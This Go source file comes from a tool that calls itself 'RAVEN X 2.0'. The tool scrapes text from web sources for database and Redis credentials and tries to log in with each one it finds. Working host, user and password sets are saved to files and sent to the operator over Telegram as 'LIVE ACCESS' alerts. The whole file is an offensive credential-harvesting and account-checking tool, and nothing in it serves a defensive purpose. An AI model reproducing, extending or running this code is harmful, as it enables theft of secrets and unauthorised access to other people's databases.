package main

import (
	"context"
	"database/sql"
	"fmt"
	"net"
	"regexp"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
)

var dbURLPat = regexp.MustCompile(`(?i)(mysql|postgres(?:ql)?|mariadb)://([^:]+):([^@]+)@([^:/]+):?(\d*)/(\S+)`)

func (a *AWSScanner) extractDBCredsFromText(text, sourceURL string) {
	if !a.Config.APIValidation.MySQL && !a.Config.APIValidation.PostgreSQL && !a.Config.APIValidation.Redis {
		return
	}

	hostPat := regexp.MustCompile(`(?i)(?:DB_HOST|DATABASE_HOST|MYSQL_HOST|POSTGRES_HOST|DB_SERVER|DB_ADDR)\s*[=:]\s*["']?([a-zA-Z0-9._-]{3,253})["']?`)
	portPat := regexp.MustCompile(`(?i)(?:DB_PORT|MYSQL_PORT|POSTGRES_PORT)\s*[=:]\s*["']?(\d{1,5})["']?`)
	namePat := regexp.MustCompile(`(?i)(?:DB_NAME|DATABASE_NAME|DB_DATABASE|MYSQL_DATABASE|POSTGRES_DB)\s*[=:]\s*["']?([a-zA-Z0-9._-]{1,64})["']?`)
	userPat := regexp.MustCompile(`(?i)(?:DB_USER|DB_USERNAME|MYSQL_USER|POSTGRES_USER|DATABASE_USER)\s*[=:]\s*["']?([a-zA-Z0-9._-]{1,64})["']?`)
	passPat := regexp.MustCompile(`(?i)(?:DB_PASS|DB_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD|DATABASE_PASSWORD|DB_SECRET)\s*[=:]\s*["']?([^\s"']{4,200})["']?`)
	driverPat := regexp.MustCompile(`(?i)(?:DB_CONNECTION|DB_DRIVER)\s*[=:]\s*["']?(mysql|pgsql|postgres|postgresql|mariadb)["']?`)

	redisHostPat := regexp.MustCompile(`(?i)REDIS_HOST\s*[=:]\s*["']?([a-zA-Z0-9._-]{3,253})["']?`)
	redisPortPat := regexp.MustCompile(`(?i)REDIS_PORT\s*[=:]\s*["']?(\d{1,5})["']?`)
	redisPassPat := regexp.MustCompile(`(?i)REDIS_PASSWORD\s*[=:]\s*["']?([^\s"']{1,200})["']?`)
	redisURLPat := regexp.MustCompile(`(?i)REDIS_URL\s*[=:]\s*["']?redis://(?::([^@]*)@)?([a-zA-Z0-9._-]{3,253}):?(\d*)["']?`)

	lines := strings.Split(text, "\n")
	windowSize := 8

	// DATABASE_URL connection strings — scan all lines first
	for _, line := range lines {
		m := dbURLPat.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		driver, user, pass, host, port, dbname := m[1], m[2], m[3], m[4], m[5], m[6]
		dbname = strings.TrimRight(dbname, "?&#")

		dbType := resolveDBType(driver, port)
		if port == "" {
			if dbType == "mysql" {
				port = "3306"
			} else {
				port = "5432"
			}
		}

		if _, loaded := a.KnownKeys.LoadOrStore("db:"+host+":"+user, true); loaded {
			continue
		}

		a.logFound("DB URL", fmt.Sprintf("%s %s@%s:%s/%s", dbType, user, host, port, dbname), sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass, dbname), "database_found.txt")

		globalCounters.mu.Lock()
		globalCounters.APIsFoundTotal++
		globalCounters.mu.Unlock()

		dispatchDBCheck(a, dbType, host, port, user, pass, dbname, sourceURL)
	}

	// Proximity cluster matching anchored on DB_HOST variants
	for i, line := range lines {
		hm := hostPat.FindStringSubmatch(line)
		if hm == nil {
			continue
		}
		host := strings.TrimSpace(hm[1])
		if host == "" {
			continue
		}

		start := i - windowSize
		if start < 0 {
			start = 0
		}
		end := i + windowSize
		if end > len(lines) {
			end = len(lines)
		}
		window := strings.Join(lines[start:end], "\n")

		port := ""
		if pm := portPat.FindStringSubmatch(window); pm != nil {
			port = pm[1]
		}

		driver := ""
		if dm := driverPat.FindStringSubmatch(window); dm != nil {
			driver = dm[1]
		}

		dbType := resolveDBType(driver, port)
		if port == "" {
			if dbType == "mysql" {
				port = "3306"
			} else {
				port = "5432"
			}
		}

		// Gate: only proceed if the relevant validator is on
		if dbType == "mysql" && !a.Config.APIValidation.MySQL {
			continue
		}
		if dbType == "postgres" && !a.Config.APIValidation.PostgreSQL {
			continue
		}

		um := userPat.FindStringSubmatch(window)
		pm2 := passPat.FindStringSubmatch(window)
		if um == nil || pm2 == nil {
			continue
		}
		user := strings.TrimSpace(um[1])
		pass := strings.TrimSpace(pm2[1])
		if user == "" || pass == "" || len(pass) < 4 {
			continue
		}

		dbname := ""
		if nm := namePat.FindStringSubmatch(window); nm != nil {
			dbname = strings.TrimSpace(nm[1])
		}

		if _, loaded := a.KnownKeys.LoadOrStore("db:"+host+":"+user, true); loaded {
			continue
		}

		a.logFound("DB Credentials", fmt.Sprintf("%s %s@%s:%s/%s", dbType, user, host, port, dbname), sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass, dbname), "database_found.txt")

		globalCounters.mu.Lock()
		globalCounters.APIsFoundTotal++
		globalCounters.mu.Unlock()

		dispatchDBCheck(a, dbType, host, port, user, pass, dbname, sourceURL)
	}

	// Redis cluster matching
	if a.Config.APIValidation.Redis {
		for i, line := range lines {
			// REDIS_URL shortcut
			if rm := redisURLPat.FindStringSubmatch(line); rm != nil {
				rpass, rhost, rport := rm[1], rm[2], rm[3]
				if rport == "" {
					rport = "6379"
				}
				if _, loaded := a.KnownKeys.LoadOrStore("redis:"+rhost, true); loaded {
					continue
				}
				a.logFound("Redis URL", fmt.Sprintf("%s:%s", rhost, rport), sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), rhost, rport, rpass), "database_found.txt")
				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
				go a.CheckRedis(rhost, rport, rpass, sourceURL)
				continue
			}

			rh := redisHostPat.FindStringSubmatch(line)
			if rh == nil {
				continue
			}
			rhost := strings.TrimSpace(rh[1])

			start := i - windowSize
			if start < 0 {
				start = 0
			}
			end := i + windowSize
			if end > len(lines) {
				end = len(lines)
			}
			window := strings.Join(lines[start:end], "\n")

			rport := "6379"
			if pp := redisPortPat.FindStringSubmatch(window); pp != nil {
				rport = pp[1]
			}

			rpass := ""
			if pp := redisPassPat.FindStringSubmatch(window); pp != nil {
				rpass = strings.TrimSpace(pp[1])
			}

			if _, loaded := a.KnownKeys.LoadOrStore("redis:"+rhost, true); loaded {
				continue
			}

			a.logFound("Redis Host", fmt.Sprintf("%s:%s", rhost, rport), sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), rhost, rport, rpass), "database_found.txt")

			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()

			go a.CheckRedis(rhost, rport, rpass, sourceURL)
		}
	}
}

// resolveDBType infers "mysql" or "postgres" from driver name or port number.
// Defaults to "mysql" when ambiguous.
func resolveDBType(driver, port string) string {
	d := strings.ToLower(driver)
	if d == "pgsql" || d == "postgres" || d == "postgresql" {
		return "postgres"
	}
	if d == "mysql" || d == "mariadb" {
		return "mysql"
	}
	if port == "5432" {
		return "postgres"
	}
	return "mysql"
}

func dispatchDBCheck(a *AWSScanner, dbType, host, port, user, pass, dbname, sourceURL string) {
	if dbType == "postgres" {
		go a.CheckPostgres(host, port, user, pass, dbname, sourceURL)
	} else {
		go a.CheckMySQL(host, port, user, pass, dbname, sourceURL)
	}
}

func (a *AWSScanner) CheckMySQL(host, port, user, pass, dbname, sourceURL string) bool {
	if !a.Config.APIValidation.MySQL {
		return false
	}

	pair := fmt.Sprintf("mysql:%s@%s:%s", user, host, port)
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)/%s?timeout=8s&readTimeout=8s&writeTimeout=8s",
		user, pass, host, port, dbname)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return false
	}
	defer db.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()

	if err := db.PingContext(ctx); err != nil {
		return false
	}

	a.logValid("MySQL", fmt.Sprintf("user=%s host=%s port=%s db=%s", user, host, port, dbname))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass, dbname), "valid_mysql.txt")
	a.storeValidKeyLimit("MySQL", pair, fmt.Sprintf("%s@%s:%s/%s", user, host, port, dbname))

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🗄️ <b>MYSQL LIVE ACCESS</b>\n\n🌐 <b>Host:</b> <code>%s:%s</code>\n🗃️ <b>Database:</b> <code>%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
		host, port, dbname, user, pass, sourceURL)
	go a.sendTelegram(msg)
	return true
}

func (a *AWSScanner) CheckPostgres(host, port, user, pass, dbname, sourceURL string) bool {
	if !a.Config.APIValidation.PostgreSQL {
		return false
	}

	pair := fmt.Sprintf("pgsql:%s@%s:%s", user, host, port)
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	dsn := fmt.Sprintf("postgres://%s:%s@%s:%s/%s?sslmode=disable&connect_timeout=8",
		user, pass, host, port, dbname)

	db, err := sql.Open("postgres", dsn)
	if err != nil {
		return false
	}
	defer db.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()

	if err := db.PingContext(ctx); err != nil {
		return false
	}

	a.logValid("PostgreSQL", fmt.Sprintf("user=%s host=%s port=%s db=%s", user, host, port, dbname))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass, dbname), "valid_postgres.txt")
	a.storeValidKeyLimit("PostgreSQL", pair, fmt.Sprintf("%s@%s:%s/%s", user, host, port, dbname))

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🗄️ <b>POSTGRESQL LIVE ACCESS</b>\n\n🌐 <b>Host:</b> <code>%s:%s</code>\n🗃️ <b>Database:</b> <code>%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
		host, port, dbname, user, pass, sourceURL)
	go a.sendTelegram(msg)
	return true
}

func (a *AWSScanner) CheckRedis(host, port, pass, sourceURL string) bool {
	if !a.Config.APIValidation.Redis {
		return false
	}

	pair := fmt.Sprintf("redis:%s:%s", host, port)
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	addr := net.JoinHostPort(host, port)
	conn, err := net.DialTimeout("tcp", addr, 8*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(8 * time.Second))

	var cmd string
	if pass != "" {
		cmd = fmt.Sprintf("AUTH %s\r\n", pass)
	} else {
		cmd = "PING\r\n"
	}

	if _, err := fmt.Fprint(conn, cmd); err != nil {
		return false
	}

	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return false
	}
	resp := string(buf[:n])

	ok := false
	if pass != "" && strings.HasPrefix(resp, "+OK") {
		ok = true
	} else if pass == "" && strings.HasPrefix(resp, "+PONG") {
		ok = true
	}

	if !ok {
		return false
	}

	a.logValid("Redis", fmt.Sprintf("host=%s port=%s", host, port))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, pass), "valid_redis.txt")
	a.storeValidKeyLimit("Redis", pair, fmt.Sprintf("%s:%s", host, port))

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🗄️ <b>REDIS LIVE ACCESS</b>\n\n🌐 <b>Host:</b> <code>%s:%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
		host, port, pass, sourceURL)
	go a.sendTelegram(msg)
	return true
}
